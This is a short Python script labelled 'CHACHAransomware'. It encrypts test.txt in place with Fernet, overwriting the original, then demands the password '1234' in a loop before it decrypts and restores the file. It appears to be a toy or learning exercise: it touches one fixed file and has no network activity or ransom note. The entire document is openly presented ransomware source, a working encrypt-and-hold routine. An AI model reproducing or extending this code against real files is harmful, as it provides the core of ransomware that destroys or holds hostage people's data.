#CHACHAransomware
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
f = open("test.txt")
txt = f.read()
byte = txt.encode()
f.close()

fw = open("test.txt",'w')
encrypted_text = cipher.encrypt(byte)
notbyte = encrypted_text.decode()
fw.write(notbyte)
fw.close()
print("encrypted:", notbyte)
while True:
    password = str(input("Enter the password: "))
    if password == "1234":
        break
    else:
        print("wrong")
decrypted_text = cipher.decrypt(encrypted_text)
decrypted_text = decrypted_text.decode()
print("decrypted:",decrypted_text)
afw = open("test.txt",'w')
afw.write(decrypted_text)
os.system('pause')
